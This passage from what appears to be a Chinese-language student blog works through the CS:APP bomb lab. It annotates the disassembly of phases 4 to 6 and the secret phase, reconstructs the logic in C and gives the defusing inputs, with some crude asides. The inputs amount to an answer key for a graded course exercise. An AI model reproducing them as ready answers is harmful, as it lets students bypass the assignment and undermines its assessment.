punctuation">(</span>a1<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span>a2<span class="token punctuation">,</span>x<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">2</span><span class="token operator">*</span>ret<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>测试代码</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token comment">//int rdi=x,edx=a1,esi=a2,rcx=tmp</span><span class="token comment">//rdi=x;edx=e;esi=0</span><span class="token keyword">int</span>  <span class="token function">func</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">,</span><span class="token keyword">int</span> a2<span class="token punctuation">,</span><span class="token keyword">int</span> x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//ret=a1</span><span class="token comment">//ret-=a2</span><span class="token comment">//int tmp=ret</span><span class="token comment">//tmp>>31</span><span class="token keyword">int</span> tmp<span class="token operator">=</span><span class="token punctuation">(</span>a1<span class="token operator">-</span>a2<span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">31</span><span class="token punctuation">;</span><span class="token keyword">int</span> ret<span class="token operator">=</span><span class="token punctuation">(</span>a1<span class="token operator">-</span>a2<span class="token operator">+</span>tmp<span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span><span class="token punctuation">;</span>tmp<span class="token operator">=</span>ret<span class="token operator">+</span>a2<span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>tmp<span class="token operator">==</span>x<span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>tmp<span class="token operator">&lt;</span>x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>ret<span class="token operator">=</span><span class="token function">func</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span>tmp<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">2</span><span class="token operator">*</span>ret<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span>tmp<span class="token operator">></span>x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> ret<span class="token operator">=</span><span class="token function">func</span><span class="token punctuation">(</span>a1<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span>a2<span class="token punctuation">,</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span> <span class="token number">2</span><span class="token operator">*</span>ret<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span><span class="token number">100</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        cout<span class="token operator">&lt;&lt;</span><span class="token function">func</span><span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后我们就能够很清楚的知道四个数字:0 1 3 7</p><p>所以答案有四种: </p><ul><li>0 0</li><li>1 0</li><li>3 0:</li><li>7 0</li></ul><h2 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h2><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">0000000000401062 &lt;phase_5&gt;:  !# %fs:0x28 -&gt; 3678849592732380416 这是一个保护堆栈的值  401062:   53                      push   %rbx  401063:   48 83 ec 20             sub    $0x20,%rsp   !# 开了32字节  401067:   48 89 fb                mov    %rdi,%rbx    !# rbx 也是string   40106a:   64 48 8b 04 25 28 00    mov    %fs:0x28,%rax  401071:   00 00   401073:   48 89 44 24 18          mov    %rax,0x18(%rsp) !# fs:0x28  401078:   31 c0                   xor    %eax,%eax  40107a:   e8 9c 02 00 00          callq  40131b &lt;string_length&gt; ;返回值是rax  40107f:   83 f8 06                cmp    $0x6,%eax       !# string_length 为6就去 4010d2 执行，否则爆炸  401082:   74 4e                   je     4010d2 &lt;phase_5+0x70&gt;  401084:   e8 b1 03 00 00          callq  40143a &lt;explode_bomb&gt;  401089:   eb 47                   jmp    4010d2 &lt;phase_5+0x70&gt;                                            !# 最初rax&#x3D;0, 循环6次， 每次处理第 rax个字符  40108b:   0f b6 0c 03             movzbl (%rbx,%rax,1),%ecx  !# ecx &#x3D; *rbx + *rax &#x3D; *rdi + *rax 即第rax个字符  40108f:   88 0c 24                mov    %cl,(%rsp)          !# 栈顶 &#x3D; cl                     即第rax个字符  401092:   48 8b 14 24             mov    (%rsp),%rdx         !# rdx &#x3D; rsp &#x3D; cl                即第rax个字符  401096:   83 e2 0f                and    $0xf,%edx           !# edx &amp;&#x3D; 0xf, edx &#x3D; cl 的低4位  即第rax个字符的低四位  401099:   0f b6 92 b0 24 40 00    movzbl 0x4024b0(%rdx),%edx !# 0x4024b0[*rdx] -&gt; edx  4010a0:   88 54 04 10             mov    %dl,0x10(%rsp,%rax,1) !dl -&gt; 0x10 + *rsp + *rax  4010a4:   48 83 c0 01             add    $0x1,%rax             !# *rax ++  4010a8:   48 83 f8 06             cmp    $0x6,%rax             !# rax !&#x3D; 0x6  即循环六次  4010ac:   75 dd                   jne    40108b &lt;phase_5+0x29&gt;  4010ae:   c6 44 24 16 00          movb   $0x0,0x16(%rsp)  4010b3:   be 5e 24 40 00          mov    $0x40245e,%esi      !# &quot;flyers&quot;  4010b8:   48 8d 7c 24 10          lea    0x10(%rsp),%rdi     !# 0x10(%rsp) ~ 0x15(%rsp)  和 &quot;flyers&quot;相等就跳转即成功了 否则爆炸  4010bd:   e8 76 02 00 00          callq  401338 &lt;strings_not_equal&gt;  4010c2:   85 c0                   test   %eax,%eax  4010c4:   74 13                   je     4010d9 &lt;phase_5+0x77&gt;  4010c6:   e8 6f 03 00 00          callq  40143a &lt;explode_bomb&gt;  4010cb:   0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)  4010d0:   eb 07                   jmp    4010d9 &lt;phase_5+0x77&gt;    4010d2:   b8 00 00 00 00          mov    $0x0,%eax  4010d7:   eb b2                   jmp    40108b &lt;phase_5+0x29&gt;;跳回40108b  4010d9:   48 8b 44 24 18          mov    0x18(%rsp),%rax  4010de:   64 48 33 04 25 28 00    xor    %fs:0x28,%rax  !# 如果相等就跳转则说明没有溢出  4010e5:   00 00   4010e7:   74 05                   je     4010ee &lt;phase_5+0x8c&gt;  4010e9:   e8 42 fa ff ff          callq  400b30 &lt;__stack_chk_fail@plt&gt;  4010ee:   48 83 c4 20             add    $0x20,%rsp  4010f2:   5b                      pop    %rbx  4010f3:   c3                      retq<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>啥逼玩意能通过偏移量达到flyers,取末尾四位,在来一遍这个地址</p><p>把这两个地址的所含字符串输出出来</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">mov    $0x40245e,%esi  movzbl 0x4024b0(%rdx),%edx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>能找到这两个字符串</p><p>问题串:adui<strong>ers</strong>n<strong>f</strong>otvby<strong>l</strong>So you think you can stop the bomb with ctrl-c, do you?</p><p>转换后的串:flyers</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">40108b:   0f b6 0c 03             movzbl (%rbx,%rax,1),%ecx  !# ecx &#x3D; *rbx + *rax &#x3D; *rdi + *rax 即第rax个字符  40108f:   88 0c 24                mov    %cl,(%rsp)          !# 栈顶 &#x3D; cl                     即第rax个字符  401092:   48 8b 14 24             mov    (%rsp),%rdx         !# rdx &#x3D; rsp &#x3D; cl                即第rax个字符  401096:   83 e2 0f                and    $0xf,%edx           !# edx &amp;&#x3D; 0xf, edx &#x3D; cl 的低4位  即第rax个字符的低四位<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>即每次取输入字符串的一个字符,取其低四位,以此为索引,在问题串中找对应偏移量的字符,存入stack中,循环六次后,和转换后的串一比较,相等即通过</p><p>偏移公式:</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">movzbl 0x4024b0(%rdx),%edx;0x4024b0是问题串的首位置 mov    %dl,0x10(%rsp,%rax,1);把它存起来,rax会递增,所以每个字符会一个一个存起来<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后对着ascII码表算一算</p><ol><li>9&gt;&gt;Y</li><li>15&gt;&gt;o</li><li>14&gt;&gt;n</li><li>5&gt;&gt;e</li><li>6&gt;&gt;f</li><li>7&gt;&gt;g</li></ol><p>答案Yonefg(其中一种)</p><h2 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h2><p>设数串为a,b,c,d,e,f</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">  0x00000000004010fc &lt;+8&gt;:     sub    $0x50,%rsp  0x0000000000401100 &lt;+12&gt;:    mov    %rsp,%r13  0x0000000000401103 &lt;+15&gt;:    mov    %rsp,%rsi  0x0000000000401106 &lt;+18&gt;:    callq  0x40145c &lt;read_six_numbers&gt;  0x000000000040110b &lt;+23&gt;:    mov    %rsp,%r14  0x000000000040110e &lt;+26&gt;:    mov    $0x0,%r12d  ;模块:即这六个数字,每个数只出现一遍且都出现  0x0000000000401114 &lt;+32&gt;:    mov    %r13,%rbp;r13的地址对应的值是第一个数字  0x0000000000401117 &lt;+35&gt;:    mov    0x0(%r13),%eax  0x000000000040111b &lt;+39&gt;:    sub    $0x1,%eax  0x000000000040111e &lt;+42&gt;:    cmp    $0x5,%eax;eax&gt;&#x3D;0x5,故a&lt;&#x3D;5  0x0000000000401121 &lt;+45&gt;:    jbe    .L1;&lt;&#x3D;就不炸  .L1;上面的一些代码保证了每一个数字都是在[1,6]之间的  0x0000000000401128 &lt;+52&gt;:    add    $0x1,%r12d;r12d++  0x000000000040112c &lt;+56&gt;:    cmp    $0x6,%r12d;跑六次循环  0x0000000000401130 &lt;+60&gt;:    je     .L2  0x0000000000401132 &lt;+62&gt;:    mov    %r12d,%ebx;ebx&#x3D;r12d  0x0000000000401135 &lt;+65&gt;:    movslq %ebx,%rax  0x0000000000401138 &lt;+68&gt;:    mov    (%rsp,%rax,4),%eax,;rax作为变量,会依次取出每一个元素,应为rsp对着的就是6,那么+1*4就是5(测试样例为6,5,4,3,2,1),每次的循环内层循环的辞书是下降的  0x000000000040113b &lt;+71&gt;:    cmp    %eax,0x0(%rbp)  ;0x0(%rbp)!&#x3D;%eax,保证六个数字每个只出现一次  0x000000000040113e &lt;+74&gt;:    jne    0x401145 &lt;phase_6+81&gt;  0x0000000000401140 &lt;+76&gt;:    callq  0x40143a &lt;explode_bomb&gt;  0x0000000000401145 &lt;+81&gt;:    add    $0x1,%ebx;ebx每次会加一,然后把值给到rax,故每次的eax是一个一个的从栈中取出元素  0x0000000000401148 &lt;+84&gt;:    cmp    $0x5,%ebx;会循环六次;这是内层循环  0x000000000040114b &lt;+87&gt;:    jle    0x401135 &lt;phase_6+65&gt;  0x000000000040114d &lt;+89&gt;:    add    $0x4,%r13;r13类似于一个栈的指针,每次会往下指一个元素然后重头遍历一遍  0x0000000000401151 &lt;+93&gt;:    jmp    0x401114 &lt;phase_6+32&gt;;这是外层循环 .L2 ;下一个模块:将每一个元素都变成7-int 0x0000000000401153 &lt;+95&gt;:    lea    0x18(%rsp),%rsi;0,4,8,12,16,20,24  0x0000000000401158 &lt;+100&gt;:   mov    %r14,%rax  0x000000000040115b &lt;+103&gt;:   mov    $0x7,%ecx  0x0000000000401160 &lt;+108&gt;:   mov    %ecx,%edx  0x0000000000401162 &lt;+110&gt;:   sub    (%rax),%edx  0x0000000000401164 &lt;+112&gt;:   mov    %edx,(%rax)  0x0000000000401166 &lt;+114&gt;:   add    $0x4,%rax  0x000000000040116a &lt;+118&gt;:   cmp    %rsi,%rax;一共会循环六次  0x000000000040116d &lt;+121&gt;:   jne    0x401160 &lt;phase_6+108&gt;    0x000000000040116f &lt;+123&gt;:   mov    $0x0,%esi  0x0000000000401174 &lt;+128&gt;:   jmp    0x401197 &lt;phase_6+163&gt;  ;这一段实现了把给定链表的数值倒序,根据权重把节点做一个移动  0x0000000000401176 &lt;+130&gt;:   mov    0x8(%rdx),%rdx  0x000000000040117a &lt;+134&gt;:   add    $0x1,%eax  0x000000000040117d &lt;+137&gt;:   cmp    %ecx,%eax  0x000000000040117f &lt;+139&gt;:   jne    0x401176 &lt;phase_6+130&gt;  0x0000000000401181 &lt;+141&gt;:   jmp    0x401188 &lt;phase_6+148&gt;  0x0000000000401183 &lt;+143&gt;:   mov    $0x6032d0,%edx;这个0x6032d0一看就很奇怪,咋突然冒出来,肯定是条件,然后发现她是链表头指针直接x&#x2F;24 0x6032d0就列出所有链表了  0x0000000000401188 &lt;+148&gt;:   mov    %rdx,0x20(%rsp,%rsi,2)搬运节点到另一个位置  0x000000000040118d &lt;+153&gt;:   add    $0x4,%rsi  0x0000000000401191 &lt;+157&gt;:   cmp    $0x18,%rsi  0x0000000000401195 &lt;+161&gt;:   je     0x4011ab &lt;phase_6+183&gt;  0x0000000000401197 &lt;+163&gt;:   mov    (%rsp,%rsi,1),%ecx;  0x000000000040119a &lt;+166&gt;:   cmp    $0x1,%ecx  0x000000000040119d &lt;+169&gt;:   jle    0x401183 &lt;phase_6+143&gt;  0x000000000040119f &lt;+171&gt;:   mov    $0x1,%eax  0x00000000004011a4 &lt;+176&gt;:   mov    $0x6032d0,%edx  0x00000000004011a9 &lt;+181&gt;:   jmp    0x401176 &lt;phase_6+130&gt;  ;对节点保存顺序的要求  0x00000000004011ab &lt;+183&gt;:   mov    0x20(%rsp),%rbx  0x00000000004011b0 &lt;+188&gt;:   lea    0x28(%rsp),%rax  0x00000000004011b5 &lt;+193&gt;:   lea    0x50(%rsp),%rsi  0x00000000004011ba &lt;+198&gt;:   mov    %rbx,%rcx  0x00000000004011bd &lt;+201&gt;:   mov    (%rax),%rdx  0x00000000004011c0 &lt;+204&gt;:   mov    %rdx,0x8(%rcx);rcx是下面的节点,rdx是上面的节点,rcx+8就是下面的节点的next地址,就是反转链表,其实不是反转,只是把链表根据权重搬迁过去后,把next重排序;;  他妈的卧槽反转链表,妈的,有理由推断出要进行遍历  ;struct node&#123;;  int val  &#x2F;&#x2F;4 ; int steps  &#x2F;&#x2F;4  ;node*next  &#x2F;&#x2F;8 ; &#125;  0x00000000004011c4 &lt;+208&gt;:   add    $0x8,%rax  0x00000000004011c8 &lt;+212&gt;:   cmp    %rsi,%rax  0x00000000004011cb &lt;+215&gt;:   je     0x4011d2 &lt;phase_6+222&gt;  0x00000000004011cd &lt;+217&gt;:   mov    %rdx,%rcx  0x00000000004011d0 &lt;+220&gt;:   jmp    0x4011bd &lt;phase_6+201&gt;  ;实现了一个链表结构  0x00000000004011d2 &lt;+222&gt;:   movq   $0x0,0x8(%rdx)  0x00000000004011da &lt;+230&gt;:   mov    $0x5,%ebp  0x00000000004011df &lt;+235&gt;:   mov    0x8(%rbx),%rax;rbx+8的值给到rax  0x00000000004011e3 &lt;+239&gt;:   mov    (%rax),%eax  0x00000000004011e5 &lt;+241&gt;:   cmp    %eax,(%rbx);所以是上面的数要小一点  0x00000000004011e7 &lt;+243&gt;:   jge    0x4011ee &lt;phase_6+250&gt;;要大于等于,不然爆炸  0x00000000004011e9 &lt;+245&gt;:   callq  0x40143a &lt;explode_bomb&gt;  0x00000000004011ee &lt;+250&gt;:   mov    0x8(%rbx),%rbx;再往上找下一个数字  0x00000000004011f2 &lt;+254&gt;:   sub    $0x1,%ebp  0x00000000004011f5 &lt;+257&gt;:   jne    0x4011df &lt;phase_6+235&gt;  0x00000000004011f7 &lt;+259&gt;:   add    $0x50,%rsp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>找出了题目给的的数组(结构体的值)</p><pre class="line-numbers language-none"><code class="language-none">(gdb) p 0x0000014c$7 &#x3D; 332   2(gdb) p  0x000000a8$8 &#x3D; 168   1(gdb) p  0x0000039c$9 &#x3D; 924   6(gdb) p 0x000002b3$10 &#x3D; 691      5(gdb) p 0x000001dd$11 &#x3D; 477   4(gdb) p  0x000001bb$12 &#x3D; 443   3(gdb)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>小于等于:降序</p><p>得到数据: 3 4 5 6 1 2</p><p>然后再把它恢复到7-int之前则是 4 3 2 1 6 5</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071305646.jpg"></p><p>注意这个链表,发现他有三个值,一个是val,一个是order,一个是指向下一个的指针,例如node1.next&#x3D;&#x3D;&gt;node2</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">node</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> val<span class="token punctuation">;</span>    <span class="token keyword">int</span> order<span class="token punctuation">;</span>    <span class="token keyword">int</span> <span class="token operator">*</span>next<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以捋顺一遍思路</p><ol><li>通过双层循环,判断6个数是[1,6]中的,并且各不相同</li><li>对六个数字取7的补,得到a1,b1,c1,d1,e1,f1</li><li>再根据取补后的数字,搬迁链表,把他按一个新的顺序排列</li><li>之后程序会对新的链表旅顺,让他能够遍历</li><li>判断下面的数都大于上面的数</li></ol><p>第3点是第五点的关键,我们知道链表一开始的排列,要把它安排成从上往下增大的形式,所以我们第一个要把924对应的node3丢过去,有规律可知,当a1&#x3D;3时会找到node3,把他搬迁过去,以此类推知道了a1-f1的顺序分别是3 4 5 6 1 2</p><p>再取补就可得到原数组 4 3 2 1 6 5</p><h2 id="secret-phase"><a href="#secret-phase" class="headerlink" title="secret_phase"></a>secret_phase</h2><p>在网上看了看发现了,这是phase_defused的反汇编函数,然后看他有一个secret_phase的调用</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">00000000004015c4 &lt;phase_defused&gt;:  4015c4:48 83 ec 78          sub    $0x78,%rsp  4015c8:64 48 8b 04 25 28 00 mov    %fs:0x28,%rax  4015cf:00 00   4015d1:48 89 44 24 68       mov    %rax,0x68(%rsp)  4015d6:31 c0                xor    %eax,%eax  4015d8:83 3d 81 21 20 00 06 cmpl   $0x6,0x202181(%rip)        # 603760 &lt;num_input_strings&gt;  4015df:75 5e                jne    40163f &lt;phase_defused+0x7b&gt;  4015e1:4c 8d 44 24 10       lea    0x10(%rsp),%r8  4015e6:48 8d 4c 24 0c       lea    0xc(%rsp),%rcx  4015eb:48 8d 54 24 08       lea    0x8(%rsp),%rdx  4015f0:be 19 26 40 00       mov    $0x402619,%esi; &quot;%d %d %s&quot;  4015f5:bf 70 38 60 00       mov    $0x603870,%edi;经过尝试发现和phase_4的寄存器地址时一样的  4015fa:e8 f1 f5 ff ff       callq  400bf0 &lt;__isoc99_sscanf@plt&gt;  4015ff:83 f8 03             cmp    $0x3,%eax  401602:75 31                jne    401635 &lt;phase_defused+0x71&gt;  #char *0x402622&#x3D;&quot;DrEvil&quot;  401604:be 22 26 40 00       mov    $0x402622,%esi  401609:48 8d 7c 24 10       lea    0x10(%rsp),%rdi  40160e:e8 25 fd ff ff       callq  401338 &lt;strings_not_equal&gt;  401613:85 c0                test   %eax,%eax  401615:75 1e                jne    401635 &lt;phase_defused+0x71&gt;  #Curses, you&#39;ve found the secret phase!  401617:bf f8 24 40 00       mov    $0x4024f8,%edi  40161c:e8 ef f4 ff ff       callq  400b10 &lt;puts@plt&gt;  #But finding it and solving it are quite different...  401621:bf 20 25 40 00       mov    $0x402520,%edi  401626:e8 e5 f4 ff ff       callq  400b10 &lt;puts@plt&gt;  40162b:b8 00 00 00 00       mov    $0x0,%eax  401630:e8 0d fc ff ff       callq  401242 &lt;secret_phase&gt;  401635:bf 58 25 40 00       mov    $0x402558,%edi  40163a:e8 d1 f4 ff ff       callq  400b10 &lt;puts@plt&gt;  40163f:48 8b 44 24 68       mov    0x68(%rsp),%rax  401644:64 48 33 04 25 28 00 xor    %fs:0x28,%rax  40164b:00 00   40164d:74 05                je     401654 &lt;phase_defused+0x90&gt;  40164f:e8 dc f4 ff ff       callq  400b30 &lt;__stack_chk_fail@plt&gt;  401654:48 83 c4 78          add    $0x78,%rsp  401658:c3                   retq   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们通过defuse_phase知道了secret的调用并且猜到了其中一个s密码,现在要找剩下的两个%d,然后发现他调用的寄存器时phase_4的,所以他们用的是同一个输入,我们直接在答案7 0 后面加一个 DrEvil ,这样就成功的进入这个secret_phase了  </p><p>secret_phase</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">0000000000401242 &lt;secret_phase&gt;:  401242:53                   push   %rbx  401243:e8 56 02 00 00       callq  40149e &lt;read_line&gt;;调用函数  401248:ba 0a 00 00 00       mov    $0xa,%edx  40124d:be 00 00 00 00       mov    $0x0,%esi  401252:48 89 c7             mov    %rax,%rdi  401255:e8 76 f9 ff ff       callq  400bd0 &lt;strtol@plt&gt;  ;  40125a:48 89 c3             mov    %rax,%rbx  40125d:8d 40 ff             lea    -0x1(%rax),%eax;eax--  401260:3d e8 03 00 00       cmp    $0x3e8,%eax&#x2F;&#x2F;eax的值 ; [1,1001]  401265:76 05                jbe    40126c &lt;secret_phase+0x2a&gt;  401267:e8 ce 01 00 00       callq  40143a &lt;explode_bomb&gt;    40126c:89 de                mov    %ebx,%esi;esi中存了  40126e:bf f0 30 60 00       mov    $0x6030f0,%edi;传一个值36进去  401273:e8 8c ff ff ff       callq  401204 &lt;fun7&gt;  401278:83 f8 02             cmp    $0x2,%eax  40127b:74 05                je     401282 &lt;secret_phase+0x40&gt;  40127d:e8 b8 01 00 00       callq  40143a &lt;explode_bomb&gt;  401282:bf 38 24 40 00       mov    $0x402438,%edi  401287:e8 84 f8 ff ff       callq  400b10 &lt;puts@plt&gt;  40128c:e8 33 03 00 00       callq  4015c4 &lt;phase_defused&gt;  401291:5b                   pop    %rbx  401292:c3                   retq   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里面strtol的函数原型是</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">long</span> <span class="token keyword">int</span> <span class="token function">strtol</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>str<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>endptr<span class="token punctuation">,</span><span class="token keyword">int</span> base<span class="token punctuation">)</span><span class="token comment">//分别是rdi,rsi,rdx</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里面edx&#x3D;10,所以strtol会对一串字符串读取其中的前面一段连续数字,然后转化成十进制</p><p>在根据10,11行可得知eax内的值&lt;&#x3D;1000</p><p>分析可知,fun_7的返回值必须得是2才能通过</p><p>fun_7</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">0000000000401204 &lt;fun7&gt;:;esi&#x3D;999     *(edi)&#x3D;36  401204:48 83 ec 08          sub    $0x8,%rsp  #if(ptr&#x3D;&#x3D;NULL)return -1  401208:48 85 ff             test   %rdi,%rdi;所以rdi的值为0就结束了,不能为0  40120b:74 2b                je     401238 &lt;fun7+0x34&gt;&#x2F;&#x2F;不能跳转,跳转就爆了  #int val &#x3D;*ptr;  # if(val-num&lt;&#x3D;0)goto fun7_28  40120d:8b 17                mov    (%rdi),%edx  40120f:39 f2                cmp    %esi,%edx  401211:7e 0d                jle    401220 &lt;fun7+0x1c&gt;;递归调用 # ptr&#x3D;*(ptr+8)  401213:48 8b 7f 08          mov    0x8(%rdi),%rdi  # int retval&#x3D;2*fun7(ptr,num)  401217:e8 e8 ff ff ff       callq  401204 &lt;fun7&gt;  40121c:01 c0                add    %eax,%eax  # goto fun7_57   return retval  40121e:eb 1d                jmp    40123d &lt;fun7+0x39&gt;  ---  fun7_28  #retval &#x3D;0  401220:b8 00 00 00 00       mov    $0x0,%eax  #if(val&#x3D;&#x3D;num)goto fun7_57  return 0  401225:39 f2                cmp    %esi,%edx  401227:74 14                je     40123d &lt;fun7+0x39&gt;;相等就跳转  # ptr&#x3D;*(ptr+0x10);&#x2F;&#x2F;ptr2  401229:48 8b 7f 10          mov    0x10(%rdi),%rdi;  # retval&#x3D;2*fun7_(ptr,num)+1  40122d:e8 d2 ff ff ff       callq  401204 &lt;fun7&gt;;递归调用  401232:8d 44 00 01          lea    0x1(%rax,%rax,1),%eax  #goto fun7_57  401236:eb 05                jmp    40123d &lt;fun7+0x39&gt;  401238:b8 ff ff ff ff       mov    $0xffffffff,%eax  #fun7_57  40123d:48 83 c4 08          add    $0x8,%rsp  401241:c3                   retq     ;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我直接挑一个地方让esi的值等于edi的值不就好了,应为fun7函数里面esi的值不变,涉及到esi的只有比较,所以我找个地方,把rax整成2,然后找到那个时候的edi的值就行了</p><p>输入命令,发现是一个链表</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">0x6030f0 &lt;n1&gt;:  0x0000000000000024      0x00000000006031100x603100 &lt;n1+16&gt;:       0x0000000000603130      0x00000000000000000x603110 &lt;n21&gt;: 0x0000000000000008      0x00000000006031900x603120 &lt;n21+16&gt;:      0x0000000000603150      0x00000000000000000x603130 &lt;n22&gt;: 0x0000000000000032      0x00000000006031700x603140 &lt;n22+16&gt;:      0x00000000006031b0      0x00000000000000000x603150 &lt;n32&gt;: 0x0000000000000016      0x00000000006032700x603160 &lt;n32+16&gt;:      0x0000000000603230      0x00000000000000000x603170 &lt;n33&gt;: 0x000000000000002d      0x00000000006031d00x603180 &lt;n33+16&gt;:      0x0000000000603290      0x00000000000000000x603190 &lt;n31&gt;: 0x0000000000000006      0x00000000006031f00x6031a0 &lt;n31+16&gt;:      0x0000000000603250      0x00000000000000000x6031b0 &lt;n34&gt;: 0x000000000000006b      0x00000000006032100x6031c0 &lt;n34+16&gt;:      0x00000000006032b0      0x00000000000000000x6031d0 &lt;n45&gt;: 0x0000000000000028      0x00000000000000000x6031e0 &lt;n45+16&gt;:      0x0000000000000000      0x00000000000000000x6031f0 &lt;n41&gt;: 0x0000000000000001      0x00000000000000000x603200 &lt;n41+16&gt;:      0x0000000000000000      0x00000000000000000x603210 &lt;n47&gt;: 0x0000000000000063      0x00000000000000000x603220 &lt;n47+16&gt;:      0x0000000000000000      0x00000000000000000x603230 &lt;n44&gt;: 0x0000000000000023      0x00000000000000000x603240 &lt;n44+16&gt;:      